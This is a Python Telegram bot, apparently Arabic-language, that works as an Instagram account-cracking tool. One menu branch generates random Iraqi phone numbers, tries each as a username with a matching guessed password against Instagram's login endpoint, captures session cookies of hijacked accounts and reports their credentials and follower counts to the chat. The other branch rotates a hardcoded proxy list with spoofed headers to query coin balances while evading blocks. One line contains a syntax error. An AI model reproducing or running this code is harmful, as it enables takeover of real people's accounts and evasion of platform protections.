import requests,user_agent,json,flask,telebot,random,os,sys
import telebot
from telebot import types
from user_agent import generate_user_agent
import logging
from config import *
from InstagramIG import *
import json
from flask import Flask, request

bot = telebot.TeleBot(BOT_TOKEN)
server = Flask(__name__)
logger = telebot.logger
logger.setLevel(logging.DEBUG)


@bot.message_handler(commands=['start'])
def boten(message):
	
    
    
    mas = types.InlineKeyboardMarkup(row_width=2)
    
    A = types.InlineKeyboardButton(text ="COINS INSTAUP|فحص نقاط انستا اب ", callback_data="F1")
    
    E = types.InlineKeyboardButton(text ="SOON INSTAUP FOLLOWERS|قريبا رشق انستا اب ", callback_data="F2")
    
    M = types.InlineKeyboardButton('المطور', url='https://t.me/t_4gi')
    
    mas.add(A,E,M)
    
    bot.send_message(message.chat.id, f"- أهلاً بكً  !\n\n- بوت تشكير حسابات انستا غرام 🧑‍💻\n\n♻️ لوحة التحكم الخاصه بك ♨️",reply_markup=mas)
    
    
@bot.callback_query_handler(func=lambda call: True)
def masg(call):
	
	
	global nam
	
	if call.data =="MohammedNajih":
		
		mas = types.InlineKeyboardMarkup(row_width=2)
		
		A = types.InlineKeyboardButton(text ="COINS INSTAUP|فحص نقاط انستا اب ", callback_data="F1")

		E = types.InlineKeyboardButton(text ="SOON INSTAUP FOLLOWERS|قريبا رشق انستا اب ", callback_data="F2")
		
		M = types.InlineKeyboardButton('المطور', url='https://t.me/t_4gi')
		
		M = types.InlineKeyboardButton('المطور', url='https://t.me/t_4gi')
		
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id, text="- أهلاً بكً عزيزي المستخدم \n\n- بوت تشكير حسابات انستا غرام 🧑‍💻\n\n♻️ لوحة التحكم الخاصه بك ♨️",reply_markup=mas)

	elif call.data =="F1":
		xm = "0987654321"
		prox = [
'193.202.86.221:8080', 
'77.243.89.22:8080', 
'194.104.128.209:8080', 
'79.110.31.87:8080', 
'193.163.207.74:8080', 
'37.72.141.159:8080', 
'193.202.86.41:8080', 
'85.239.48.61:8080', 
'46.161.57.234:8080', 
'46.161.58.238:8080', 
'178.20.214.197:8080', 
'109.94.175.227:8080', 
'109.94.174.112:8080', 
'193.202.86.27:8080', 
'109.94.221.42:8080', 
'193.202.87.105:8080', 
'5.133.122.224:8080', 
'46.253.131.146:8080', 
'193.163.207.104:8080', 
'193.233.248.60:8080', 
'193.187.94.107:8080', 
'193.202.10.74:8080', 
'109.236.53.34:8080', 
'193.187.95.204:8080', 
'37.72.141.244:8080', 
'193.151.191.224:8080', 
'193.187.95.65:8080', 
'193.233.248.34:8080', 
'85.239.55.33:8080', 
'5.133.122.171:8080', 
'109.94.221.37:8080', 
'193.163.207.101:8080', 
'193.151.191.175:8080', 
'94.231.217.216:8080', 
'45.140.205.77:8080', 
'85.239.48.201:8080', 
'37.72.141.54:8080', 
'109.94.173.25:8080', 
'46.253.131.228:8080', 
'109.236.53.105:8080', 
'193.200.12.81:8080', 
'193.151.191.120:8080', 
'193.233.250.199:8080', 
'193.202.85.116:8080', 
'45.145.130.161:8080', 
'193.187.92.201:8080', 
'193.233.248.12:8080', 
'193.202.15.206:8080', 
'193.151.191.214:8080', 
'193.151.190.121:8080', 
'46.161.58.20:8080', 
'85.239.50.166:8080', 
'46.161.57.179:8080', 
'77.83.25.20:8080', 
'193.233.250.112:8080', 
'193.187.93.155:8080', 
'193.233.250.247:8080', 
'109.94.175.204:8080', 
'109.236.54.49:8080', 
'146.185.205.155:8080', 
'77.83.27.208:8080', 
'193.202.86.250:8080', 
'77.243.89.228:8080', 
'193.202.86.194:8080', 
'193.202.8.134:8080', 
'109.236.54.134:8080', 
'146.185.206.52:8080', 
'178.20.214.143:8080', 
'194.104.128.130:8080', 
'146.19.90.177:8080', 
'109.94.222.218:8080', 
'193.163.92.113:8080', 
'5.133.122.113:8080'
		]
		xl = ['5', '4' ,'3', '1']
		ok=0
		cp=0
		sk=0
		file='done.txt'
		for Mohammed in open(file,'r').read().splitlines():
			while True:
				proxy=str(''.join((random.choice(prox) for i in range(1))))
				id=str(Mohammed.split('\n')[0])
				proxies = {
				'http': 'http://{}'.format(proxy)
				}
				link = f'https://impracticalrightshoutcast.mrrobotreal1.repl.co/?uid={id}&submit=submit'
				headers = {
                 "Host": "impracticalrightshoutcast.mrrobotreal1.repl.co",
                 "Connection": "keep-alive",
                 "Cache-Control": "max-age=0",
                 "sec-ch-ua": 'Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"',
                 "sec-ch-ua-mobile": "?1",
                 "sec-ch-ua-platform": "Android",
                 "X-Chrome-offline": "persist=0 reason=reload",
                 "Upgrade-Insecure-Requests": "1",
                 "User-Agent": str(generate_user_agent()),
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                 "Sec-Fetch-Site": "none",
                 "Sec-Fetch-Mode": "navigate",
                 "Sec-Fetch-User": "?1",
                 "Sec-Fetch-Dest": "document",
                 "Accept-Encoding": "gzip",
                 "Accept-Language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7", 
                 "X-Forwarded-For": proxy }
				response = requests.get(link,headers=headers,proxies=proxies).text
				if ('{"coins":null}}')in response:
					cp+=1
				elif ('{"status":"Successful","message":"Sucess!","return":{"coins":"') in response:
					ok+=1
					coins = response.split('{"coins":"')[1]
					coin = coins.split('"}')[0]
					bot.send_message(call.message.chat.id,f"‹ ✅ {id} Coins ==> {coin} =====> • @t_4gi")
				elif ('instaup.developers@gmail.com') in response:
					IP='instaup.developers@gmail.com'
				else:
					sk+=1
					mas = types.InlineKeyboardMarkup(row_width=2)
					A = types.InlineKeyboardButton(f'GOOD : {ok}',callback_data="1x")
					E = types.InlineKeyboardButton(f'EROR : {cp}', callback_data="1x")
					B = types.InlineKeyboardButton(f'{id}', callback_data="1x")
					R = types.InlineKeyboardButton(f'{sk}', callback_data="1x")
					K = = types.InlineKeyboardButton(f'IP IS BLOCKER{IP}', callback_data="1x")
					M = types.InlineKeyboardButton('المطور', url='https://t.me/t_4gi')
					mas.add(A,E,B,R,K,M)
					bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text="جاري الفحص النقاط ",reply_markup=mas)
				
			
		
		
	elif call.data =="F2":
		xl = ['780', '781' ,'782', '783', '784' , '770','771', '773','774','750','751','752','753','754','772']
		xm = "0987654321"
		ok=0
		cp=0
		sk=0
		while True:
			bs = str(''.join(random.choice(xm)for i in range(7))) 
			bl = str(''.join(random.choice(xl)for i in range(1)))
			user = '+964'+str(bl)+str(bs)
			pasw = str(bs)
			url = 'https://www.instagram.com/accounts/login/ajax/'
			headers= {
            'accept':'*/*',
            'accept-encoding':'gzip,deflate,br',
            'accept-language':'en-US,en;q=0.9,ar;q=0.8',
            'content-length':'318',
            'content-type':'application/x-www-form-urlencoded',
            'cookie':'ig_did=271DF213-1F8B-4915-ACD4-68A2757ACFA8;ig_nrcb=1;csrftoken=Ubi0fJyZPlAAeUK727wQDnqnSKwcd6Wn;mid=YPWRsAAEAAFDJlnvAjZAzkFpDOis-',
            'origin':'https://www.instagram.com',
            'referer':'https://www.instagram.com/accounts/login/',
            'sec-fetch-dest':'empty',
            'sec-fetch-mode':'cors',
            'sec-fetch-site':'same-origin',
            'user-agent':generate_user_agent(),
            'x-asbd-id': '437806',
            'x-csrftoken':'Ubi0fJyZPlAAeUK727wQDnqnSKwcd6Wn',
            'x-ig-app-id':'1217981644879628',
            'x-ig-www-claim':'0',
            'x-instagram-ajax':'bad7ed4b1b35',
            'x-requested-with':'XMLHttpRequest'}
			data = {
            'username':user,
            'enc_password':f'#PWD_INSTAGRAM_BROWSER:0:1626959271:{pasw}',
            'queryParams':'{}',
            'optIntoOneTap':'false'}
			req = requests.post(url, headers=headers, data=data)
			login = json.loads(req.content)
			if ("userId") in str(login):
				ok+=1
				sk+=1
				id = str(login['userId'])
				sessionid = str(req.cookies['sessionid'])
				uri = 'https://i.instagram.com/api/v1/users/{}/info/'.format(id)
				headers = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
                'cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+str(sessionid),
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/',
                'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent':generate_user_agent(),
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgbG4'}
				response = requests.Session().get(uri, data=False, headers=headers)
				username = str(response.json()['user']['username'])
				followers = str(response.json()['user']['follower_count'])
				following = str(response.json()['user']['following_count'])
				post = str(response.json()['user']['media_count'])
				date = SidraELEzz.data(str(username))
				bot.send_message(call.message.chat.id,f"‹ ᴜѕᴇʀɴᴀᴍᴇ instagram  ✓\n────── • ✧✧ • ──────\n‹ ᴜѕᴇʀɴᴀᴍᴇ : @{user}\n password : {pasw} \n fowllwers : {followers} \n fowllwing : {following} \n post : {post} \n data : {date} \n────── • ✧✧ • ──────\n• @t_4gi")
				
			else:
				cp+=1
				sk+=1
				mas = types.InlineKeyboardMarkup(row_width=2)
				A = types.InlineKeyboardButton(f'GOOD : {ok}', callback_data="1x")
				E = types.InlineKeyboardButton(f'EROR : {cp}', callback_data="1x")
				B = types.InlineKeyboardButton(f'{user}', callback_data="1x")
				R = types.InlineKeyboardButton(f'{sk}', callback_data="1x")
				M = types.InlineKeyboardButton('المطور', url='https://t.me/t_4gi')
				mas.add(A,E,B,R,M)
				bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text="ok start",reply_markup=mas)
		

@server.route(f"/{BOT_TOKEN}", methods=["POST"])
def redirect_message():
    json_string = request.get_data().decode("utf-8")
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

if __name__ == "__main__":
    bot.remove_webhook()
    bot.set_webhook(url="https://coinspy.herokuapp.com/"+str(BOT_TOKEN))
    server.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
